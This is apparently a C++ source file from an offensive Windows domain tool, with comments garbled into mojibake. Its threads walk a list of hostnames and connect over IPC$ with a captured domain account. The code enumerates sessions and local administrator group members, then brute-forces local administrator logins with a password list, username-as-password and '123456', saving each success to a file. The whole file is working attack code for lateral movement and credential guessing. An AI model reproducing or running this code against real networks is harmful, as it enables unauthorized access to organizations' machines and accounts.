#include "multiThread.h"


std::mutex mtx;

// ���캯��
multiThread::multiThread(LPWSTR lpDomainUserName, LPWSTR lpDomainUserPassword, std::vector<std::wstring> stdPasswordList, 
	HANDLE hAliveFile, HANDLE hLocalFile, HANDLE hSuccessFile, HANDLE hNetSessionsFile)
{
	// ��ʼ��winsock ����
	WSADATA wsaData;					// winsock ����  gethostbyname������ǰ������
	int iResult;						// winsock�����Ƿ�ɹ�

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed: %d\n", iResult);
	}

	DomainUserName = lpDomainUserName;
	DomainUserPassword = lpDomainUserPassword;
	PasswordList = stdPasswordList;
	//wprintf(L"[------]%s  %s\n", lpDomainUserName, lpPassword);

	AliveFile = hAliveFile;
	LocalFile = hLocalFile;
	SuccessFile = hSuccessFile;
	NetSessionsFile = hNetSessionsFile;
}

// ������������
void multiThread::saveAlive(LPCWSTR ComputerName, LPWSTR ip)
{
	PWCHAR wstr = new WCHAR[MAX_PATH];
	StringCchPrintfW(wstr, MAX_PATH, L"[%s] %s\n", ComputerName, ip);
	theCommonApi.WriteFileApi(AliveFile, wstr);
	delete wstr;
}

// �������������ı��ع�����
void multiThread::saveLocal(LPCWSTR ComputerName, std::wstring eachAdministrator)
{
	PWCHAR wstr = new WCHAR[MAX_PATH];
	StringCchPrintfW(wstr, MAX_PATH, L"[%s] %s\n", ComputerName, eachAdministrator);
	theCommonApi.WriteFileApi(LocalFile, wstr);
	delete wstr;
}

// ����ÿ̨�������net sessions
void multiThread::saveNetSessions(LPCWSTR ComputerName, LPSESSION_INFO_10 ipNetSession)
{
	PWCHAR wstr = new WCHAR[MAX_PATH];
	StringCchPrintfW(wstr, MAX_PATH, L"Server: %s\tClient: %s\tUser: %s\tActive: %d\n", ComputerName, ipNetSession->sesi10_cname,
		ipNetSession->sesi10_username, ipNetSession->sesi10_time);
	theCommonApi.WriteFileApi(NetSessionsFile, wstr);
	delete wstr;
}


// ���߳�
void multiThread::attack(int i, std::vector<std::wstring>* hostnameList)
{
	std::vector<std::wstring>* Host = hostnameList;
	while (true) {
		mtx.lock();
		if (Host->empty()) {
			mtx.unlock();
			break;
		}
		std::wstring stdComputerName = Host->back();
		Host->pop_back();

		mtx.unlock();

		LPCWSTR lpComputerName;					// ���ANSI��������
		lpComputerName = stdComputerName.data();
		
		run(i, lpComputerName);
	}
}


// ��ʼ����
void multiThread::run(int i, LPCWSTR ComputerName)
{

	// wprintf(L"[#%d] %s\n", i, ComputerName);
	Sleep(1000);
	struct hostent* remoteHost;			// ��Ž����������
	struct in_addr addr;				// ip��ַ�Ľṹ��
	int j = 0;										// ������������IP�±�


	remoteHost = gethostbyname(theCommonApi.UnicodeToAnsi(ComputerName));			// ����������

	if (remoteHost == NULL)							// ����ʧ��
	{
		wprintf(L"[#%d] gethostbyname error for computerName:%s %d\n", i, ComputerName, GetLastError());
		
	}
	else if (remoteHost->h_addrtype == AF_INET)			// �����ɹ�
	{
		BOOL isSuccess = FALSE;							// ����Ȩ�޵ı�־
		while (remoteHost->h_addr_list[j] != 0)			// ����ÿ��IP
		{
			addr.s_addr = *(u_long*)remoteHost->h_addr_list[j++];
			LPWSTR ip = theCommonApi.AnsiToUnicode(inet_ntoa(addr));					// 192.168.52.2
			// wprintf(L"[#%d] [1] %s -> %s\n", i, ComputerName, ip);			// [#1] WIN12-IIS  -> 192.168.168.189

			if (theWNetApi.detectAlive(i, ip, ComputerName))			// ���IP
			{
				saveAlive(ComputerName, ip);				// �������������ͽ���������IP���浽����alive.txt�ļ���

				LPWSTR aliveIp;										// �����������IPC���ӣ���ȡ���ع�����
				std::wstring uncAliveIP = L"\\\\";					// unc·����IP
				uncAliveIP.append(ip);
				aliveIp = (LPWSTR)uncAliveIP.data();				// aliveIp \\192.168.52.2
				//wprintf(L"net use \\%s /u:%s %s", aliveIp, DomainUserName, DomainUserPassword);
				
				if (theWNetApi.WNetAddConnection2Api(aliveIp, DomainUserName, DomainUserPassword) == 0)
				{
					continue;						// ʹ�����û����˺���������IP����IPC���������ʧ�ܣ���continue�����¸�IP��������
				}

				// ��ȡ�������net session
				getNetSessions(i, ComputerName, aliveIp);
				
				std::vector<std::wstring> ipAdministratorsGroup;				// ���ÿ��IP�ı��ع������Ա  WIN12-IIS\Administrator   HACK\iis_user
				ipAdministratorsGroup = theWNetApi.NetLocalGroupGetMembersApi(aliveIp);

				// ɾ��IPC���Ӻ�Ȼ���Ա���������
				theWNetApi.WNetCancelConnection2Api(aliveIp);
				
				
				// ���Ա���������
				isSuccess = weakPasswordBlasting(i, ComputerName, ipAdministratorsGroup, SuccessFile);
				if (isSuccess)				// �ɹ����¸û���������ѭ��
					break;
				

			}
			else							// �����IP, ��continue�����¸�IP��������
			{
				continue;
			}
			

			// ipList.push_back(inet_ntoa(addr));
		}
	}
}

// ��ȡnet session
void multiThread::getNetSessions(int i, LPCWSTR ComputerName, LPWSTR aliveIp)
{
	std::vector<LPSESSION_INFO_10> ipNetSessions;			// ����ÿ̨�������ǰ��¼���û�������net session��¼��IPC���ӣ�������rdp��¼��
	ipNetSessions = theWNetApi.NetSessionEnumApi(aliveIp);
	if (ipNetSessions.size() > 1)				// ���������1����ô���������Լ����ݵ����û���Ŀ�����������sessions������������������������Ҫ����1
	{
		wprintf(L"[#%d] %s net sessions: %d\n", i, aliveIp, ipNetSessions.size());

		for (auto ipNetSession : ipNetSessions)
		{
			wprintf(L"[#%d] Server: %s\tClient: %s\tUser:   %s\tActive: %d\n", i, ComputerName, ipNetSession->sesi10_cname,
				ipNetSession->sesi10_username, ipNetSession->sesi10_time);
			saveNetSessions(ComputerName, ipNetSession);		// ����ÿ̨�������net sessions
			NetApiBufferFree(ipNetSession);				// ���ڴ�
		}
	}

}

// �������
BOOL multiThread::weakPasswordBlasting(int i, LPCWSTR ComputerName, std::vector<std::wstring> ipAdministratorsGroup, HANDLE SuccessFile)
{
	// aliveIP \\192.168.52.2

	std::vector<std::wstring> aaa;					// ���봴��vector�����ı���ȥ����splitString���ص�ֵ����Ȼȡ�������ݻ�����
	aaa = theCommonApi.splitString(DomainUserName, L"\\");
	DomainName = aaa[0].c_str();			// ȡ������  eg:hack
	UserName = aaa[1].c_str();			// ���û���	eg:iis_user

	for (auto eachAdministrator : ipAdministratorsGroup)						// eachAdministrator   hack\iis_user
	{
		wprintf(L"-> %s\n", eachAdministrator.data());
		saveLocal(ComputerName, eachAdministrator);					// ��������ı��ع����鱣�浽����local.txt�ı���


		std::vector<std::wstring> hostnameUsername;
		hostnameUsername = theCommonApi.splitString(eachAdministrator.data(), L"\\");		// �ָ�   hack\iis_user
		LPCWSTR hostName = hostnameUsername[0].c_str();							// ������  hack    WEB_IIS
		LPCWSTR administratorUserName = hostnameUsername[1].c_str();				// ����Ա������  iis_user

		std::wstring unc = L"\\\\";
		unc.append(ComputerName);
		LPWSTR lpUncComputerName = (LPWSTR)unc.data();			// unc·����������     \\WEB_IIS
		LPWSTR lpTotalAdministratorName = (LPWSTR)eachAdministrator.data();		// ���ع������Ա      WIN7-PC\administrator   hack\iis_user
		// LPWSTR lpRemoteIP = (LPWSTR)hostname.data();

		// wprintf(L"%s    %s    %s     %s\n", hostName, administratorUserName, DomainName, UserName);

		int iComp1 = CompareString(GetThreadLocale(), NORM_IGNORECASE, hostName, lstrlenW(hostName), DomainName, lstrlenW(DomainName));  // �Ƚ��ַ���hostName��lpDomainName

		if (iComp1 == CSTR_EQUAL)			// ����Ա�����û�
		{
			// wprintf(L"[domain]  The administrator is a domain user  %s %s\n", hostName, administratorUserName);
			// domain admins		pass
			int iComp2 = CompareString(GetThreadLocale(), NORM_IGNORECASE, administratorUserName, lstrlenW(administratorUserName), L"Domain Admins", lstrlenW(L"Domain Admins"));
			// wprintf(L"[#%d] [!] the domain user is %s : %s\n", i, hostName, lpTotalAdministratorName);
			// domain users		�������û����Ǹ�������Ĺ���Ա
			int iComp21 = CompareString(GetThreadLocale(), NORM_IGNORECASE, administratorUserName, lstrlenW(administratorUserName), L"Domain Users", lstrlenW(L"Domain Users"));

			if (iComp2 == CSTR_EQUAL)			// pass���
			{
				// wprintf(L"[#%d] [-] Pass Domain Admins\n", i);
				continue;
			}
			else if (iComp21 == CSTR_EQUAL)
			{
				wprintf(L"iComp21 : %d, %s\n", iComp21, administratorUserName);
				theCommonApi.saveIPCok(SuccessFile, lpUncComputerName, DomainUserName, DomainUserPassword);
				continue;
				// return TRUE;				// ����ѭ������Ϊ�Ѿ�������̨������
			}
			else									// ��ͨ���û�-�ж��Ƿ��ǵ�ǰ���յ����û�
			{
				// �жϱ��ع���������û��Ƿ����Ѿ����յ����û�
				int iComp4 = CompareString(GetThreadLocale(), NORM_IGNORECASE, administratorUserName, lstrlenW(administratorUserName), UserName, lstrlenW(UserName));
				if (iComp4 == CSTR_EQUAL)			// ���ع���������û����Ѿ����յ����û�
				{
					// wprintf(L"\t\t[ok] Congratulations on taking this domain computers.    %s  %s\n", lpUncComputerName, lpTotalAdministratorName);  // ��Ҫ���浽�ı���

					if (theWNetApi.WNetAddConnection2Api(lpUncComputerName, lpTotalAdministratorName, DomainUserPassword) == 1)		// ���Ѿ����յ����û��˺���������������������
					{
						theCommonApi.saveIPCok(SuccessFile, lpUncComputerName, lpTotalAdministratorName, DomainUserPassword);
						continue;
						// return TRUE;		// ����ѭ������Ϊ�Ѿ�������̨������	
					}
					else
					{
						wprintf(L"[#%d] [Fail] net use %s /u:%s %s\n", i, lpUncComputerName, lpTotalAdministratorName, DomainUserPassword);
						continue;			// ʹ���Ѿ����յ����û��˺����뽨��ʧ��
					}
				}
				else					// pass���ع���������û������������û�
				{
					// wprintf(L"[#%d] [-] Pass domain user %s\n", i, lpTotalAdministratorName);
					continue;
				}
			}

		}
		else												// ����Ա�Ǳ����û�
		{
			// wprintf(L"[local]  The administrator is a local user %s %s\n", hostName, lpTotalAdministratorName);
			int iComp3 = CompareString(GetThreadLocale(), NORM_IGNORECASE, administratorUserName, lstrlenW(administratorUserName), L"Administrator", lstrlenW(L"Administrator"));
			if (iComp3 == CSTR_EQUAL)
			{
				// wprintf(L"[#%d] [!] the local user is %s : %s\n", i, hostName, lpTotalAdministratorName);    // ����administraotr�û�
				for (auto each : PasswordList)				// ����ÿ������
				{
					LPWSTR password = (LPWSTR)each.data();				// ������123456, ͨ������
					if (theWNetApi.WNetAddConnection2Api(lpUncComputerName, lpTotalAdministratorName, password) == 1)
					{
						theCommonApi.saveIPCok(SuccessFile, lpUncComputerName, lpTotalAdministratorName, password);
						continue;
						// return TRUE;				// ����ѭ������Ϊ�Ѿ�������̨������
					}
					else
					{
						wprintf(L"[#%d] [Fail] net use %s /u:%s %s\n", i, lpUncComputerName, lpTotalAdministratorName, password);
						continue;				// ����������󣬻���һ������
					}
				}
			}
			else
			{
				// wprintf(L"[#%d] [!] the local user is %s : %s\n", i, hostName, lpTotalAdministratorName);     // ���������û�
				if (theWNetApi.WNetAddConnection2Api(lpUncComputerName, lpTotalAdministratorName, (LPWSTR)administratorUserName) == 1)		// ����������Ϊ�û���
				{
					theCommonApi.saveIPCok(SuccessFile, lpUncComputerName, lpTotalAdministratorName, (LPWSTR)administratorUserName);
					continue; 
					// return TRUE;				// ����ѭ������Ϊ�Ѿ�������̨������
				}
				else if (theWNetApi.WNetAddConnection2Api(lpUncComputerName, lpTotalAdministratorName, L"123456") == 1)					// ����������Ϊ123456
				{
					theCommonApi.saveIPCok(SuccessFile, lpUncComputerName, lpTotalAdministratorName, L"123456");
					continue; 
					// return TRUE;				// ����ѭ������Ϊ�Ѿ�������̨������
				}
				else
				{
					wprintf(L"[#%d] [Fail] net use %s /u:%s %s\n", i, lpUncComputerName, lpTotalAdministratorName, administratorUserName);
					continue;				// ����������󣬻���һ������
				}
			}
		}

	}
	return TRUE;
}

